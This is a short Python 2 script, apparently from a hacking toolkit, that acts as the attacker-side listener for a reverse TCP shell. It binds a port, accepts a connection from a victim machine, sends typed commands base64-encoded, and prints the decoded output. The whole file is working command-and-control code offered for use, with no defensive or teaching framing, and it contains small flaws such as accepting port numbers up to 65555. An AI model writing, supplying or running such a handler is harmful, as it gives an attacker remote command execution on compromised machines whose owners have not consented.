"""
Client for reverse_tcp(to send command etc.)

[~] Concat : b3mb4m@protonmail.com
[~] Greetz : Bomberman,T-rex,Pixi


"""


import socket 
from base64 import b64encode
from base64 import b64decode	



class Client(object):
	def __init__(self, PORT):
		PORT = int(PORT)
		try:
			self.server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
			self.server.bind(("0.0.0.0", PORT))
			self.server.listen(2)
			print ("Listening on port {0}... ".format( PORT))
			(self.client, (ip, PORT)) = self.server.accept()
			print (" Received connection from : {0}".format( ip))
			self.getcommand()
		except:
			return None


	def exit(self):
		self.client.send(self.crypt( "quit"))
		self.client.close()
		self.server.close()
		from sys import exit
		exit()		


 	def getcommand(self):
		while True:
			try:
				command = raw_input('~$ ')
				if not command:
					continue
			except(KeyboardInterrupt):
				self.exit()

			if command == "quit":
				self.exit()
			else:
				print self.crypt(command)
				self.client.send( self.crypt(command))
				en_data = self.client.recv(4096)
				en_data = self.crypt( en_data, False)
				print (en_data)


	@staticmethod
	def crypt( TEXT, encode=True):
		return b64encode(TEXT) if encode else b64decode(TEXT)


if __name__ == '__main__':
	from sys import argv
	if len(argv) == 2:
		if argv[1]:
			try:
			    input = raw_input 
			except NameError:
			    pass 
			if 0 <= int(argv[1]) <= 65555:
				Client(argv[1])
	else:
		print ("\nUsage: {0} PORT\n".format(argv[0]))